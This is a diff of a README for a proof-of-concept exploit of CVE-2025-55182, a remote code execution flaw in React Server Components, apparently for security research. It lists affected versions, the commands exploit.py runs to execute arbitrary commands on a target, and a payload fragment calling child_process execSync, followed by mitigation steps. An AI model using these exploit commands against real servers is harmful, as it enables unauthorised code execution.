@@ -1,6 +1,7 @@
 # CVE-2025-55182 (React2Shell) - Proof of Concept
 
 ## ⚠️ SECURITY RESEARCH ONLY
+
 This repository contains a proof of concept for **CVE-2025-55182**, a critical remote code execution vulnerability in React Server Components. This is for **authorized security testing and research purposes only**.
 
 ## Vulnerability Overview
@@ -16,11 +17,13 @@ This repository contains a proof of concept for **CVE-2025-55182**, a critical r
 ### Affected Versions
 
 **React:**
+
 - 19.0.0
 - 19.1.0, 19.1.1
 - 19.2.0
 
 **Next.js:**
+
 - 15.0.0 to 15.0.4
 - 15.1.0 to 15.1.8
 - 15.2.0 to 15.2.5
@@ -48,11 +51,13 @@ The vulnerability exploits unsafe deserialization in the React Server Components
 ### Installation
 
 1. **Install dependencies:**
+
 ```bash
 npm install
 ```
 
 2. **Start the vulnerable server:**
+
 ```bash
 npm run dev
 ```
@@ -71,6 +76,8 @@ app/
 
 ## Running the Exploit
 
+> **For detailed exploitation guide including interactive shell and advanced features, see [more-about-exploit.md](more-about-exploit.md)**
+
 ### Basic Usage
 
 ```bash
@@ -86,11 +93,13 @@ python3 exploit.py -t http://localhost:3000 -c "whoami"
 ### Examples
 
 **Check if target is vulnerable:**
+
 ```bash
 python3 exploit.py -t http://localhost:3000 --check-only
 ```
 
 **Execute arbitrary commands:**
+
 ```bash
 # Get user info
 python3 exploit.py -t http://localhost:3000 -c "id"
@@ -116,8 +125,9 @@ Header: Next-Action: x (triggers RSC processing)
 ```
 
 The payload manipulates the internal `_response` object to execute:
+
 ```javascript
-process.mainModule.require('child_process').execSync('<command>')
+process.mainModule.require("child_process").execSync("<command>");
 ```
 
 ## Mitigation
@@ -125,6 +135,7 @@ process.mainModule.require('child_process').execSync('<command>')
 ### Immediate Actions
 
 1. **Update React:**
+
    ```bash
    npm install react@19.3.0 react-dom@19.3.0
    ```
@@ -180,6 +191,7 @@ Content-Type: multipart/form-data
 This proof of concept is provided for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this information.
 
 **DO NOT:**
+
 - Use this exploit against systems you don't own or have explicit permission to test
 - Deploy this in production environments
 - Share exploit code without proper context and warnings
